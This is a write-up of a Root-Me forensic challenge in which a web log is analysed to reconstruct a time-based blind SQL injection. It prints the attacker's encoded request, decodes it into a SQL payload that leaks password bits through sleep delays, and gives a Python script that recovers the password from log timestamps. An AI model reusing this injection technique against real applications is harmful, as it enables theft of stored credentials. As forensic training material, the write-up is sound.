# Log analysis web attack

[root-me challenge](https://www.root-me.org/en/Challenges/Forensic/Logs-analysis-web-attack): Our website appears to have been attacked, but our system administrator does not understand web server logs. Can you find out if any data has been stolen?

----

First request:

```text
192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
```

Apache log, urldecode and base64decode:

```text
SELECT (
    CASE FIELD (
        concat(
            SUBSTRING(
                    bin(ascii(SUBSTRING(password,1,1))), 1, 1
            ),
            SUBSTRING(
                    bin(ascii(SUBSTRING(password,1,1))), 2, 1
            )
        ),
        concat(CHAR(48),CHAR(48)),
        concat(CHAR(48),CHAR(49)),
        concat(CHAR(49),CHAR(48)),
        concat(CHAR(49),CHAR(49))
)
    WHEN 1 THEN TRUE
    WHEN 2 THEN sleep(2)
    WHEN 3 THEN sleep(4)
    WHEN 4 THEN sleep(6)
    END
) FROM membres WHERE id=1
```

A blind sql injection attack, in which the attacker executes multiple queries separated by commas. `ASC` to display the list of members in order of largest to smallest, unrelated to the following query. From the select segment, the code to get the content of the password in the `mebres` table has `id=1`; with each character in the password field converted to integer, then to binary string. Each request in turn takes each 2 character bits of the binary string and finds its position in the field – `field(xx,'00','01','10','11')`, case `field=1` returns true, and other values of `field` lead to `sleep` (different values).

```python
from datetime import datetime

f = open("ch13.txt", "r")

timeList = []

char = ''
flag = ""

for line in f:
    timeList += [line[30:38]]

f.close()

for i in range(len(timeList) - 1):
    print(datetime.strptime(timeList[i], '%H:%M:%S'))
    print(datetime.strptime(timeList[i + 1], '%H:%M:%S'))

    timeleft = datetime.strptime(timeList[i + 1], '%H:%M:%S') - datetime.strptime(timeList[i], '%H:%M:%S')
    if i % 4 in [0, 1, 2]:
        if str(timeleft) == '0:00:00':
            char += '00'
        if str(timeleft) == '0:00:02':
            char += '01'
        if str(timeleft) == '0:00:04':
            char += '10'
        if str(timeleft) == '0:00:06':
            char += '11'
    if i % 4 == 3:
        if str(timeleft) == '0:00:02':
            char += '0'
        if str(timeleft) == '0:00:04':
            char += '1'
        print(char)
        flag += chr(int(char, 2))
        char = ''

print(flag)
```
